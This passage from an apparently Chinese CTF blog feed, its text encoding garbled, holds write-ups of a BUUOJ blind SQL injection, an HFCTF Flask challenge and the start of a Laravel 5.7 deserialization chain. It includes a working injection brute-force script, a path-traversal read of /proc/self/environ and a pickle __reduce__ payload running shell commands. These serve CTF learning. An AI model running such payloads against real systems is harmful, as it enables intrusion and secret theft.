alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20210506163137166.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å½“åŒ¹é…ä¸åˆ°è¿”å›0åˆ™exp(710)æŠ¥é”™<br><img src="https://img-blog.csdnimg.cn/20210506164538650.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åˆ°è¿™é‡Œé¢˜ç›®æ€è·¯å°±å‡ºæ¥äº†</p><figure class="highlight py"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs py">&gt; - <span class="hljs-string">&#x27;username&#x27;</span> : <span class="hljs-string">&quot;admin\\&quot;</span>    è½¬ä¹‰å•å¼•å·é€ æˆé”™è¯¯é—­åˆ<br>&gt; - <span class="hljs-string">&#x27;password&#x27;</span> : <span class="hljs-string">&quot;||exp(710-(code rlike binary ....))#&quot;</span> å…¶ä¸­ç©ºæ ¼ç”¨ç¼–ç ç»•è¿‡ï¼ˆ<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0c</span>)ï¼Œå¼•å·ç”¨åå…­è¿›åˆ¶ç»•è¿‡<br>&gt; - <span class="hljs-string">&quot;code&quot;</span> : <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>é¢˜ç›®é™åˆ¶äº†åªæœ‰å››ä¸ªåå…­è¿›åˆ¶çš„æ•°å¤§å°ï¼Œåˆ™ä¸èƒ½ä¸€ä¸ªä¸ªçˆ†ç ´ï¼Œä½†æ€è·¯å·²ç»å‡ºæ¥äº†ï¼Œå‰©ä¸‹å°±æ˜¯å†™è„šæœ¬äº†.<br>ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªå€¼å¾—æ³¨æ„çš„é—®é¢˜å°±æ˜¯å› ä¸ºrlikeæ˜¯å¯¹æ‰€æœ‰çš„è¿›è¡ŒåŒ¹é…ä¸æ˜¯ä»å¼€å¤´ï¼Œæ‰€ä»¥åŒ¹é…è¿‡ç¨‹ä¸­å¯èƒ½ä¼šå‡ºç°å¤šè§£ï¼Œè¿™ä¸ªåé¢ä¼šè¯´åˆ°</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">num_waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;/i&#x27;</span>,<span class="hljs-variable">$str</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Huge num detected&#x27;</span>);<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>expå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transfer_to_hex</span>(<span class="hljs-params">num</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> num])<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br>    part = <span class="hljs-string">&#x27;erg&#x27;</span><br>    result = <span class="hljs-string">&#x27;erg&#x27;</span><br>    count = <span class="hljs-number">0</span><br>    temp = <span class="hljs-string">&#x27;&#x27;</span><br>    alphabet = string.digits + string.ascii_letters<br>    url = <span class="hljs-string">&#x27;http://4e2056fd-b5b8-4e3c-b3df-86d99baa43c9.node3.buuoj.cn&#x27;</span><br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>        temp = transfer_to_hex(part)<br>        count = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> alphabet:<br>            s = transfer_to_hex(j)<br>            payload = <span class="hljs-string">&quot;||exp(710-(code rlike binary 0x&quot;</span> + temp + s + <span class="hljs-string">&quot;))#&quot;</span><br>            payload = payload.replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0c</span>))<br>            <span class="hljs-comment"># print(payload)</span><br>            data = &#123;<br>                <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin\\&quot;</span>,<br>                <span class="hljs-string">&quot;password&quot;</span>: payload,<br>                <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;1&quot;</span><br>            &#125;<br>            res = requests.post(url + <span class="hljs-string">&quot;/login.php&quot;</span>, data=data, allow_redirects=<span class="hljs-literal">False</span>)<br>            <span class="hljs-comment"># print(req.text)</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;fail&#x27;</span> <span class="hljs-keyword">in</span> res.text):<br>                count = count + <span class="hljs-number">1</span><br>                <span class="hljs-keyword">if</span> count &gt; <span class="hljs-number">1</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1: &quot;</span> + result )<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2: &quot;</span> + result[:-<span class="hljs-number">1</span>] + j)<br>                <span class="hljs-keyword">else</span>:<br>                    part = part[<span class="hljs-number">1</span>:] + j<br>                    result = result + j<br>                    <span class="hljs-built_in">print</span>(result)<br>                    <span class="hljs-comment"># print(part)</span><br>exp()<br><span class="hljs-comment"># ||exp(710-(code rlike binary 0x65726730))#</span><br><span class="hljs-comment"># ||exp(710-(code|rlike|binary|0x65))#</span><br></code></pre></div></td></tr></table></figure><p>è¿™ä¸ªåœ°æ–¹è¦å…ˆè·‘å‡ºå‰å‡ ä¸ªå­—ç¬¦<br><img src="https://img-blog.csdnimg.cn/20210506175331227.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20210506175347610.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/2021050617540682.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åç”¨å‰ä¸‰ä¸ªç¬¬å››ä¸ªï¼Œç¬¬å››ä¸ªæ¨ç¬¬äº”ä¸ªä»¥æ­¤ç±»æ¨ï¼Œä½†è¿™é‡Œç¡®å®å‡ºç°äº†å¤šè§£ï¼Œäº¤æ¢æ•°å­—å­—æ¯è¡¨çš„é¡ºåºä¼šè·‘å‡ºæ¥ä¸¤ç§ç»“æœ<br><img src="https://img-blog.csdnimg.cn/20210506181237183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20210506181714835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä»”ç»†è§‚å¯Ÿä¸€ä¸‹ç¬¬ä¸€ç§ç»“æœåé¢å½¢æˆäº†ä¸€ç§æ­»å¾ªç¯åˆ™gh2uåº”è¯¥åœ¨gh23å‰é¢ï¼Œåˆ™å¯ä»¥æ¨æµ‹å‡ºcodeæœ€ç»ˆä¸º</p><ul><li>erghruigh2uygh23uiu32ig<br>æœ€åç”¨admin\è´¦å·ç™»å½• å¯†ç ç”¨||1# éªŒè¯ç ç”¨erghruigh2uygh23uiu32igå³å¯è·å¾—flag<br><img src="https://img-blog.csdnimg.cn/20210506183812271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li></ul><ul><li>æ€»ç»“ä¸€ä¸‹ï¼šæ³¨å…¥çœŸçš„åšå¤§ç²¾æ·±ï¼Œå¤šç§¯ç´¯è¿™äº›æ–¹æ³•å§</li></ul>]]></content>
    
    
    <categories>
      
      <category>buuåˆ·é¢˜è®°å½•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>BUU</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HFCTFeasyflask</title>
    <link href="/2021/05/04/2021-5-4-%5BHFCTF%5Dezsyflask/"/>
    <url>/2021/05/04/2021-5-4-%5BHFCTF%5Dezsyflask/</url>
    
    <content type="html"><![CDATA[<h2 id="æ–‡ç« ç›®å½•"><a href="#æ–‡ç« ç›®å½•" class="headerlink" title="æ–‡ç« ç›®å½•"></a>æ–‡ç« ç›®å½•</h2><h4 id="æŒ‰æç¤ºæ‰¾åˆ°æºç "><a href="#æŒ‰æç¤ºæ‰¾åˆ°æºç " class="headerlink" title="- æŒ‰æç¤ºæ‰¾åˆ°æºç "></a>- æŒ‰æç¤ºæ‰¾åˆ°æºç </h4><h4 id="æ‰¾åˆ°secret-key"><a href="#æ‰¾åˆ°secret-key" class="headerlink" title="- æ‰¾åˆ°secret key"></a>- æ‰¾åˆ°secret key</h4><h4 id="æ„é€ ååºåˆ—åŒ–ä¼ªé€ cookie"><a href="#æ„é€ ååºåˆ—åŒ–ä¼ªé€ cookie" class="headerlink" title="- æ„é€ ååºåˆ—åŒ–ä¼ªé€ cookie"></a>- æ„é€ ååºåˆ—åŒ–ä¼ªé€ cookie</h4><hr><h2 id="æ‰¾æºç "><a href="#æ‰¾æºç " class="headerlink" title="æ‰¾æºç "></a>æ‰¾æºç </h2><p>è¿™ä¸ªæŒ‰é¢˜ç›®æç¤ºæ„é€ /file?file=/app/sourceå³å¯å¾—åˆ°æºç </p><h2 id="æ‰¾secret-key"><a href="#æ‰¾secret-key" class="headerlink" title="æ‰¾secret key"></a>æ‰¾secret key</h2><p>å®¡è®¡æºç åˆ°è¿™å‘ç°æœ‰ä¸€ä¸ªé»‘åå•è¿‡æ»¤ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªè·¯å¾„æ‹¼æ¥ï¼Œçœ‹åˆ°è¿™é‡Œæ˜¾ç„¶å¯ä»¥æƒ³åˆ°è¯»å–ä»»æ„æ–‡ä»¶ï¼Œç™¾åº¦äº†ä¸€ä¸‹os.path.jpin()å‡½æ•°å‘ç°æœ‰æ¼æ´</p><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">os.path.<span class="hljs-keyword">join</span>()å‡½æ•°ç”¨äºè·¯å¾„æ‹¼æ¥æ–‡ä»¶è·¯å¾„ã€‚<br>os.path.<span class="hljs-keyword">join</span>()å‡½æ•°ä¸­å¯ä»¥ä¼ å…¥å¤šä¸ªè·¯å¾„ï¼š<br><br>ä¼šä»ç¬¬ä¸€ä¸ªä»¥â€/â€å¼€å¤´çš„å‚æ•°å¼€å§‹æ‹¼æ¥ï¼Œä¹‹å‰çš„å‚æ•°å…¨éƒ¨ä¸¢å¼ƒã€‚<br><br>ä»¥ä¸Šä¸€ç§æƒ…å†µä¸ºå…ˆã€‚åœ¨ä¸Šä¸€ç§æƒ…å†µç¡®ä¿æƒ…å†µä¸‹ï¼Œè‹¥å‡ºç°â€.<span class="hljs-regexp">/â€å¼€å¤´çš„å‚æ•°ï¼Œä¼šä»â€./</span>â€å¼€å¤´çš„å‚æ•°çš„ä¸Šä¸€ä¸ªå‚æ•°å¼€å§‹æ‹¼æ¥ã€‚<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210504125249732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¹‹åç›´æ¥è¾“è·¯å¾„å°±è¡Œæœ€å¼€å§‹æˆ‘è¯»çš„æ˜¯/etc/passwd,/etc/profileï¼Œåæ¥å‘ç°éƒ½æ²¡å•¥ä½œç”¨ï¼Œæœ€åæ‰å‘ç°è¿˜æœ‰ä¸€ä¸ªç¨‹åºçš„ç¯å¢ƒå˜é‡/procæ–‡ä»¶å¤¹ï¼Œå¯¹äº/procæ–‡ä»¶çš„è§£é‡Šå¦‚ä¸‹</p><figure class="highlight armasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs armasm">/<span class="hljs-meta">proc</span>æ–‡ä»¶ç³»ç»Ÿä¸‹çš„å¤šç§æ–‡ä»¶æä¾›çš„ç³»ç»Ÿä¿¡æ¯ä¸æ˜¯é’ˆå¯¹æŸä¸ªç‰¹å®šè¿›ç¨‹çš„ï¼Œè€Œæ˜¯èƒ½å¤Ÿåœ¨æ•´ä¸ªç³»ç»ŸèŒƒå›´çš„ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨ã€‚å¯ä»¥ä½¿ç”¨çš„æ–‡ä»¶éšç³»ç»Ÿ<br>é…ç½®çš„å˜åŒ–è€Œå˜åŒ–ã€‚å‘½ä»¤procinfoèƒ½å¤Ÿæ˜¾ç¤ºåŸºäºå…¶ä¸­æŸäº›æ–‡ä»¶çš„å¤šç§ç³»ç»Ÿä¿¡æ¯ã€‚ä»¥ä¸‹è¯¦ç»†æè¿°/<span class="hljs-meta">proc</span>ä¸‹çš„æ–‡ä»¶ã€‚ <br><br>/<span class="hljs-meta">proc</span>æ–‡ä»¶ç³»ç»Ÿæ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒåªå­˜åœ¨å†…å­˜å½“ä¸­ï¼Œè€Œä¸å ç”¨å¤–å­˜ç©ºé—´ã€‚å®ƒä»¥æ–‡ä»¶ç³»ç»Ÿçš„æ–¹å¼ä¸ºè®¿é—®ç³»ç»Ÿå†…æ ¸æ•°æ®çš„æ“ä½œæä¾›æ¥å£ã€‚ç”¨æˆ·å’Œ<br>åº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡ <span class="hljs-meta">proc</span>å¾—åˆ°ç³»ç»Ÿçš„ä¿¡æ¯ï¼Œå¹¶å¯ä»¥æ”¹å˜å†…æ ¸çš„æŸäº›å‚æ•°ã€‚ç”±äºç³»ç»Ÿçš„ä¿¡æ¯ï¼Œå¦‚è¿›ç¨‹ï¼Œæ˜¯åŠ¨æ€æ”¹å˜çš„ï¼Œæ‰€ä»¥ç”¨æˆ·æˆ–åº”ç”¨ç¨‹åºè¯»å–pr<br><span class="hljs-symbol">oc</span>æ–‡ä»¶æ—¶ï¼Œ<span class="hljs-meta">proc</span>æ–‡ä»¶ç³»ç»Ÿæ˜¯ åŠ¨æ€ä»ç³»ç»Ÿå†…æ ¸è¯»å‡ºæ‰€éœ€ä¿¡æ¯å¹¶æäº¤çš„ã€‚<br></code></pre></div></td></tr></table></figure><p>æœ€åè¯»/proc/self/environå¯å¾—åˆ°secret key<br><img src="https://img-blog.csdnimg.cn/20210504130045223.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="æ„é€ ååºåˆ—åŒ–ä¼ªé€ cookie-1"><a href="#æ„é€ ååºåˆ—åŒ–ä¼ªé€ cookie-1" class="headerlink" title="æ„é€ ååºåˆ—åŒ–ä¼ªé€ cookie"></a>æ„é€ ååºåˆ—åŒ–ä¼ªé€ cookie</h2><p>ç›´æ¥å°†ä»£ç å¤åˆ¶ä¸‹æ¥æ”¹ä¸€ä¸‹userç±»æœ¬åœ°è·‘ä¸€ä¸‹session</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3.6</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, session<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&quot;SECRET_KEY&quot;</span>] = <span class="hljs-string">&quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot;</span><br><br><span class="hljs-comment"># User = type(&#x27;User&#x27;, (object,), &#123;</span><br><span class="hljs-comment">#     &#x27;uname&#x27;: &#x27;test&#x27;,</span><br><span class="hljs-comment">#     &#x27;is_admin&#x27;: 1,</span><br><span class="hljs-comment">#     &#x27;__repr__&#x27;: lambda o: o.uname,</span><br><span class="hljs-comment">#     &#x27;__reduce__&#x27;: (eval, (&quot;__import__(&#x27;os&#x27;).popen(&#x27;echo `cat /flag` &gt; /tmp/111&#x27;).read()&quot;,)),</span><br><span class="hljs-comment"># &#125;)</span><br><span class="hljs-comment"># def __reduce__(self):</span><br><span class="hljs-comment">#     # os.system(&#x27;ls &gt; /1.txt&#x27;)</span><br><span class="hljs-comment">#     # cmd = &quot;__import__(&#x27;os&#x27;).popen(&#x27;echo `cat /flag` &gt; /tmp/111&#x27;).read()&quot;</span><br><span class="hljs-comment">#     return (eval, (&quot;__import__(&#x27;os&#x27;).popen(&#x27;echo `cat /flag` &gt; /tmp/111&#x27;).read()&quot;,))</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span>:</span><br>    uname = <span class="hljs-string">&#x27;aaa&#x27;</span><br>    is_admin = <span class="hljs-number">1</span><br>    __repr__: <span class="hljs-keyword">lambda</span> o: o.uname<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;echo `cat /flag` &gt; /tmp/111&#x27;).read()&quot;</span>,))<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index_handler</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;u&#x27;</span>):<br>        u = pickle.dumps(User())<br>        session[<span class="hljs-string">&#x27;u&#x27;</span>] = u<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/file?file=index.js&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">file_handler</span>():</span><br>    path = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>    path = os.path.join(<span class="hljs-string">&#x27;static&#x27;</span>, path)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path) <span class="hljs-keyword">or</span> os.path.isdir(path) \<br>            <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.py&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.sh&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> path:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;disallowed&#x27;</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>        content = fp.read()<br>    <span class="hljs-keyword">return</span> content<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">admin_handler</span>():</span><br>    <span class="hljs-keyword">try</span>:<br>        u = session.get(<span class="hljs-string">&#x27;u&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(u, <span class="hljs-built_in">dict</span>):<br>            u = b64decode(u.get(<span class="hljs-string">&#x27;b&#x27;</span>))<br>        u = pickle.loads(u)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;uhh?&#x27;</span><br><br>    <span class="hljs-keyword">if</span> u.is_admin == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome, admin&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;who are you?&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210504130220724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å°†sessionå¤åˆ¶åˆ°åŸç¯å¢ƒå³å¯ï¼Œæ­£å¸¸æˆåŠŸçš„è¯å†è®¿é—®/adminåº”è¯¥è¿”å›500<br><img src="https://img-blog.csdnimg.cn/20210504130320450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ€»ç»“ä¸€ä¸‹ï¼šä¸»è¦è€ƒç‚¹åœ¨äºå¯¹flaskçš„sessionæœºåˆ¶çš„äº†è§£ï¼Œå¯¹sessionä¼ªé€ çš„æŒæ¡ï¼Œè¿˜æœ‰è¦çŸ¥é“secrey keyä¸€èˆ¬å­˜æ”¾åœ¨ç¯å¢ƒå˜é‡çš„å“ªä¸ªæ–‡ä»¶å¤¹ï¼Œä»¥åŠå¯¹pythonååºåˆ—åŒ–æ”»å‡»çš„æŒæ¡.</p>]]></content>
    
    
    <categories>
      
      <category>buuåˆ·é¢˜è®°å½•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>BUU</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>laravel5.7æ¼æ´å¤ç°</title>
    <link href="/2021/04/30/2021-4.30-laravel5.7%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/04/30/2021-4.30-laravel5.7%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="æ–‡ç« ç›®å½•"><a href="#æ–‡ç« ç›®å½•" class="headerlink" title="æ–‡ç« ç›®å½•"></a>æ–‡ç« ç›®å½•</h3><ul><li>laravelç¯å¢ƒæ­å»º</li></ul><ul><li>popé“¾åˆ†æ</li></ul><ul><li>æ„é€ ååºåˆ—åŒ–payload<h2 id="laravelç¯å¢ƒæ­å»º"><a href="#laravelç¯å¢ƒæ­å»º" class="headerlink" title="laravelç¯å¢ƒæ­å»º"></a>laravelç¯å¢ƒæ­å»º</h2>è¿™ä¸ªä¸ç”¨å¤šè¯´äº†ï¼Œç½‘ä¸Šå¾ˆå¤šå¤§ä½¬éƒ½å†™è¿‡å¾ˆè¯¦ç»†çš„åšå®¢ï¼Œå¯ä»¥å€Ÿé‰´<h2 id="popé“¾åˆ†æ"><a href="#popé“¾åˆ†æ" class="headerlink" title="popé“¾åˆ†æ"></a>popé“¾åˆ†æ</h2>laravel5.7æ¼æ´ä¸»è¦åˆ©ç”¨vendor/laravel/framework/src/Illuminate/Foundation/Testingæ–‡ä»¶å¤¹ä¸‹çš„ä¸€ä¸ªPendingCommandç±»ï¼Œè¯¥ç±»ä¸­æœ‰å‡ ä¸ªç§æœ‰ç‰¹æ€§<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;           <span class="hljs-comment">//ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\Auth\GenericUser</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;         <span class="hljs-comment">//ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\Foundation\Application</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$command</span>;     <span class="hljs-comment">//è¦æ‰§è¡Œçš„phpå‡½æ•° system</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$parameters</span>;  <span class="hljs-comment">//è¦æ‰§è¡Œçš„phpå‡½æ•°çš„å‚æ•°  array(&#x27;id&#x27;)</span><br></code></pre></div></td></tr></table></figure></li><li>ç”¨äºå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°ä¸ºPendingCommand.phpä¸­çš„run()å‡½æ•°<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span 